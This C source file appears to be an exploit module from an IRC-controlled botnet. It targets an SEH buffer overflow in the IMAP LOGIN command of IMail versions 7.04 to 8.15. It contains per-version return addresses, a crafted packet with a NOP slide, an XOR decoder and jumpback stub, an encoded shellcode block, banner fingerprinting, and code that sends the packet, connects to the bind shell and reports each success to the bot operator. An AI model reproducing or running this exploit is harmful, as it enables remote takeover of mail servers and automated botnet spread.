//!	IMail v7.04 - v8.15
//|
//| Bad characters: 
//| 
//| 0x00 0x22 0x24 0x25 0x26 0x27 0x28 0x29 0x0a 0x3a 0x2a 0x0d
//|
//| Shellcode space:
//|
//| 492 bytes
//|
//| Affects:
//|
//| Windows: NT, 2000, XP, 2003
//|

#include "includes.h"
#include "functions.h"

#ifndef NO_IMAIL

struct ImailTargets_s 
{
	int		iSEHAddress;
	long	lOffset;
};

/*unsigned char szShellcode[] =
{
	"\x2b\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x0f"
	"\x90\x9f\xb2\x83\xee\xfc\xe2\xf4\xf3\xfa\x74\xff\xe7\x69\x60\x4d"
	"\xf0\xf0\x14\xde\x2b\xb4\x14\xf7\x33\x1b\xe3\xb7\x77\x91\x70\x39"
	"\x40\x88\x14\xed\x2f\x91\x74\xfb\x84\xa4\x14\xb3\xe1\xa1\x5f\x2b"
	"\xa3\x14\x5f\xc6\x08\x51\x55\xbf\x0e\x52\x74\x46\x34\xc4\xbb\x9a"
	"\x7a\x75\x14\xed\x2b\x91\x74\xd4\x84\x9c\xd4\x39\x50\x8c\x9e\x59"
	"\x0c\xbc\x14\x3b\x63\xb4\x83\xd3\xcc\xa1\x44\xd6\x84\xd3\xaf\x39"
	"\x4f\x9c\x14\xc2\x13\x3d\x14\xf2\x07\xce\xf7\x3c\x41\x9e\x73\xe2"
	"\xf0\x46\xf9\xe1\x69\xf8\xac\x80\x67\xe7\xec\x80\x50\xc4\x60\x62"
	"\x67\x5b\x72\x4e\x34\xc0\x60\x64\x50\x19\x7a\xd4\x8e\x7d\x97\xb0"
	"\x5a\xfa\x9d\x4d\xdf\xf8\x46\xbb\xfa\x3d\xc8\x4d\xd9\xc3\xcc\xe1"
	"\x5c\xc3\xdc\xe1\x4c\xc3\x60\x62\x69\xf8\x84\x8b\x69\xc3\x16\x53"
	"\x9a\xf8\x3b\xa8\x7f\x57\xc8\x4d\xd9\xfa\x8f\xe3\x5a\x6f\x4f\xda"
	"\xab\x3d\xb1\x5b\x58\x6f\x49\xe1\x5a\x6f\x4f\xda\xea\xd9\x19\xfb"
	"\x58\x6f\x49\xe2\x5b\xc4\xca\x4d\xdf\x03\xf7\x55\x76\x56\xe6\xe5"
	"\xf0\x46\xca\x4d\xdf\xf6\xf5\xd6\x69\xf8\xfc\xdf\x86\x75\xf5\xe2"
	"\x56\xb9\x53\x3b\xe8\xfa\xdb\x3b\xed\xa1\x5f\x41\xa5\x6e\xdd\x9f"
	"\xf1\xd2\xb3\x21\x82\xea\xa7\x19\xa4\x3b\xf7\xc0\xf1\x23\x89\x4d"
	"\x7a\xd4\x60\x64\x54\xc7\xcd\xe3\x5e\xc1\xf5\xb3\x5e\xc1\xca\xe3"
	"\xf0\x40\xf7\x1f\xd6\x95\x51\xe1\xf0\x46\xf5\x4d\xf0\xa7\x60\x62"
	"\x84\xc7\x63\x31\xcb\xf4\x60\x64\x5d\x6f\x4f\xda\xff\x1a\x9b\xed"
	"\x5c\x6f\x49\x4d\xdf\x90\x9f\xb2"
};*/

/*
	Type 0: SEH address at 700
	Type 1: SEH address at 692
								*/
ImailTargets_s pImailTargets [] = 
{ 
	{ 0, 0x10010579 },	// imailsec.dll pop/pop/ret (v7.04 - v7.04.2)
	{ 0, 0x100108FE },	// imailsec.dll pop/pop/ret (v7.05 - v7.05.2)
	{ 0, 0x100108CB },	// imailsec.dll pop/pop/ret (v7.06 - v7.07.3)
	{ 0, 0x10010372 },	// imailsec.dll pop/pop/ret (v7.10 - v7.10.1)
	{ 0, 0x1001038F },	// imailsec.dll pop/pop/ret (v7.11 - v7.11.1)
	{ 0, 0x100103DF },	// imailsec.dll pop/pop/ret (v7.12 - v7.12.1)
	{ 0, 0x100139D6 },	// imailsec.dll pop/pop/ret (v7.13 - v7.15.3)
	{ 0, 0x100102E2 },	// imailsec.dll pop/pop/ret (v8.00 - v8.03)
	{ 0, 0x10010302 },	// imailsec.dll pop/pop/ret (v8.04)
	{ 0, 0x100249d4 },	// imailsec.dll pop/pop/ret (v8.05 - v8.05.3)
	{ 1, 0x10021835 },	// mailbox.dll pop/pop/ret (v8.10 - v8.10.1)
	{ 1, 0x10021855 },	// mailbox.dll pop/pop/ret (v8.10.2)
	{ 1, 0x100218E6 },	// mailbox.dll pop/pop/ret (v8.11)
	{ 1, 0x10021782 },	// mailbox.dll pop/pop/ret (v8.12)
	{ 1, 0x10021A51 },	// mailbox.dll pop/pop/ret (v8.13 - v8.14)
	{ 1, 0x10021A62 }	// mailbox.dll pop/pop/ret (v8.15)
};

char szImailPacket [] =
{
	//| Login header (12)
	"a01 LOGIN \"&"

	//| NOP slide as space for shellcode (492)
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

	//| Fill correct addresses (12)
	"\x90\x90\x90\x90"	// ("RET"-ADDR)
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"	// ("WRITE"-ADDR)

	//| NOP slide (174)
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

	//| Short jump (2)
	"\xEB\x04" // (jmp +4 -> over pop/pop/ret address)

	//| Fill SEH location 0 (v8.1x/v8.2x)
	"\x90\x90\x90\x90"
	"\x90\x90"

	//| Short jump
	"\xEB\x04" // (jmp +4 -> over pop/pop/ret address)

	//| Fill SEH location 1 (v7.0x/v7.1x/v8.0x)
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

	//|  --------------------------
	//| (22 byte xor decoder (0x55))
	//|  --------------------------
	// "\xEB\x0F" // jmp short bogus
	// begin: "\x5B" // pop ebx
	// "\x33\xC9" // xor ecx,ecx
	// "\x66\x83\xE9\xEE" // sub cx, -0x12 (-18)
	// decode: "\x80\x33\x55" // xor byte ptr [ebx], 0x55
	// "\x43" // inc ebx
	// "\xE2\xFA" // loopd short encode
	// "\xEB\x05" // jmp code
	// bogus: "\xE8\xEC\xFF\xFF\xFF" // call begin
	"\xEB\x0F\x5B\x33\xC9\x66\x83\xE9\xEE\x80\x33\x55\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF"

	// ----------------------------------------
	// 18 byte jumpback code
	// ----------------------------------------
	// "\xD9\xEE" // fldz
	// "\xD9\x74\x24\xF4" // fstenv [esp-12]
	// "\x59" // pop ecx
	// "\x80\xC1\x08" // add cl, 0a
	// "\x80\xED\x03" // sub ch, 3 (3 x 256)
	// "\x80\xE9\xDE" // sub cl, 222 (1 x 222)
	// "\xFF\xE1" // jmp ecx
	// ----------------------------------------
	"\x8C\xBB\x8C\x21\x71\xA1\x0C\xD5\x94\x5D\xD5\xB8\x56\xD5\xBC\x8B\xAA\xB4"
	"\x90\x90"

	//| NOP slide (180)
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

	"\" \"m00\"\r\n"
};

BOOL iMail( char *target, void* conn,EXINFO exinfo )
{
	IRC* irc=(IRC*)conn;
	char szBanner[512];//, szShellcode[512];
	int iRemoteTarget;
	int ibindsize=405;
	SOCKET sSocket;

if (!exinfo.silent && exinfo.verbose) irc->privmsg(target,"Beginning attack on %s",exinfo.ip);Sleep(1500);

	SOCKADDR_IN sinSockAddrIn;
	memset(&sinSockAddrIn, 0, sizeof(sinSockAddrIn));

	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_addr.s_addr	= finet_addr(exinfo.ip);
	sinSockAddrIn.sin_port			= fhtons(exinfo.port);

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Initializing IP and port for %s:%d",exinfo.ip,exinfo.port);Sleep(1500);

	if(!(sSocket = fWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)))
		return FALSE;

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Creating Socket for %s",exinfo.ip);Sleep(1500);

	if(fconnect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn)) == SOCKET_ERROR)
		return FALSE;

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Connecting to socket for %s",exinfo.ip);Sleep(1500);

	if(frecv(sSocket, szBanner, sizeof(szBanner), 0) == SOCKET_ERROR)
		return FALSE;

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Getting Banner for %s",exinfo.ip);Sleep(1500);

	if (strstr(szBanner,"IMail 7.04"))
		iRemoteTarget = 0;
	else if (strstr(szBanner,"IMail 7.05"))
		iRemoteTarget = 1;
	else if (strstr(szBanner,"IMail 7.06"))
		iRemoteTarget = 2;
	else if (strstr(szBanner,"IMail 7.07"))
		iRemoteTarget = 2;
	else if (strstr(szBanner,"IMail 7.10"))
		iRemoteTarget = 3;
	else if (strstr(szBanner,"IMail 7.11"))
		iRemoteTarget = 4;
	else if (strstr(szBanner,"IMail 7.12"))
		iRemoteTarget = 5;
	else if (strstr(szBanner,"IMail 7.13"))
		iRemoteTarget = 6;
	else if (strstr(szBanner,"IMail 7.14"))
		iRemoteTarget = 6;
	else if (strstr(szBanner,"IMail 7.15"))
		iRemoteTarget = 6;
	else if (strstr(szBanner,"IMail 8.00"))
		iRemoteTarget = 7;
	else if (strstr(szBanner,"IMail 8.01"))
		iRemoteTarget = 7;
	else if (strstr(szBanner,"IMail 8.02"))
		iRemoteTarget = 7;
	else if (strstr(szBanner,"IMail 8.03"))
		iRemoteTarget = 7;
	else if (strstr(szBanner,"IMail 8.04"))
		iRemoteTarget = 8;
	else if (strstr(szBanner,"IMail 8.05"))
		iRemoteTarget = 9;
	else if (strstr(szBanner,"IMail 8.10"))
		iRemoteTarget = 10;
	else if (strstr(szBanner,"IMail 8.11"))
		iRemoteTarget = 12;
	else if (strstr(szBanner,"IMail 8.12"))
		iRemoteTarget = 13;
	else if (strstr(szBanner,"IMail 8.13"))
		iRemoteTarget = 14;
	else if (strstr(szBanner,"IMail 8.14"))
		iRemoteTarget = 14;
	else if (strstr(szBanner,"IMail 8.15"))
		iRemoteTarget = 15;
	else
		iRemoteTarget = -1;

if (!exinfo.silent && exinfo.verbose) irc->privmsg(target,"Banner for %s is %s, iRemoteTarget is %d",exinfo.ip,szBanner,iRemoteTarget);Sleep(1500);

	memcpy(szImailPacket + 12, bindshell, ibindsize -1);

	if (iRemoteTarget == -1) return FALSE;
	if (pImailTargets[iRemoteTarget].iSEHAddress == 0) 
		memcpy(szImailPacket + 700, &pImailTargets[iRemoteTarget].lOffset, 4);
	else 
		if (pImailTargets[iRemoteTarget].iSEHAddress == 1)
			memcpy(szImailPacket + 692, &pImailTargets[iRemoteTarget].lOffset, 4);

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Crafting Malicious Packet for %s",exinfo.ip);Sleep(1500);

	if(fsend(sSocket, szImailPacket, sizeof(szImailPacket), 0) == SOCKET_ERROR)
		return FALSE;

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Malicious packet for %s sent",exinfo.ip);Sleep(1500);

	fclosesocket(sSocket);

if (!exinfo.silent && exinfo.verbose)irc->privmsg(target,"Socket Closed for %s",exinfo.ip);Sleep(1500);
	
	if (ConnectShell(exinfo,bindport))
	{
		if (!exinfo.silent)
			irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		exploit[exinfo.exploit].stats++;
	} else
		if (!exinfo.silent && exinfo.verbose)
			irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		return FALSE;
}

#endif
